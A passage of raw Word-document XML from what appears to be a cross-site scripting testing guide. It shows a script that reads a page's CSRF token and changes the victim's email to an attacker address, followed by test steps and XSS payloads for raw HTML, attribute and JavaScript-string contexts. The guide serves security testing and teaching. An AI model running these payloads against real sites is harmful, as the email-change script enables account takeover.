          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>var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req</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>XMLHt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>tpRequest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>req.onload</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handleResponse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>req.open</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('get','/my-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>account',true</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>req.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">function </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>handleResponse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>() {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> token = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>this.responseText.match</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(/name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>" value="(\w+)"/)[1];</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>var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changeReq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>XMLHttpRequest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>changeReq.open</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('pos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>t', '/my-account/change-email', true);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>changeReq.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>='+token+'&amp;email=attacker@naughty.com')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>};</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Submit a short alphanumeric payload into every entry point of the site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Identify where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ethat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> input is returned in the HTTP response.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Te</w:t>
      </w:r>
      <w:r>
        <w:t>st if the return context is vulnerably to XSS (any context that executes JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>XSS contexts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Locations where an HTTP response can execute JavaScript:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Raw HTML</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Response is dumped directly into the DOM:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img</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src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=alert(1)&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>HTML attributes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Response is injected into an HTML attribute.  This can be caused by terminating an existing element or adding a new attribute:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>"&gt;&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">" autofocus </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>onfocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>) x="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>javascript:alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>JavaScript sinks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Terminating an existing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> element or breaking out of a string:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo = "user controlled data";</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;!-- Malicious values:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img</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src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
